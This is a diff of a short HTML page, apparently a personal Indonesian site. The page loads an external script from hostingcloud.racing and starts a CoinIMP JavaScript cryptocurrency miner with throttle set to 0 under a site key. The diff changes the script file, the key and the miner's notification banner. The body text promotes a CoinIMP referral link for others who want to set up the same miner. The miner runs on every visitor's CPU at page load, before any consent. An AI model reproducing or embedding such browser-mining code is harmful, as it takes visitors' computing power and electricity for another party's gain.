@@ -1,12 +1,13 @@
 <html>
 <head>
-<script src="https://www.hostingcloud.racing/ElSO.js"></script>
+<script src="https://www.hostingcloud.racing/JP6z.js"></script>
 <script>
-    var _client = new Client.Anonymous('a9679183499345b1300d2eb4b33bba1d932384ef6dd29e9cb25a1ddc31d968c8', {
+    var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
         throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "Nurutomo is running JavaScript miner from coinimp.com in this site", "#cccccc", 40, "#3d3d3d");
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
 </script>
 <script>
     setTimeout(function(){
@@ -39,6 +40,6 @@ setTimeout(function(){
 <body>
 Kalo ada yang mau buat klik link dibawah ini
 <br>
-<a href="https://www.coinimp.com/invite/7fc231d6-5ba5-499d-a833-bc7b24ede7c5">https://www.coinimp.com/invite/7fc231d6-5ba5-499d-a833-bc7b24ede7c5</a>
+<a href="https://www.coinimp.com/invite/7fc231d6-5ba5-499d-a833-bc7b24ede7c5">https://www.coinimp.com/</a>
 </body>
 </html>
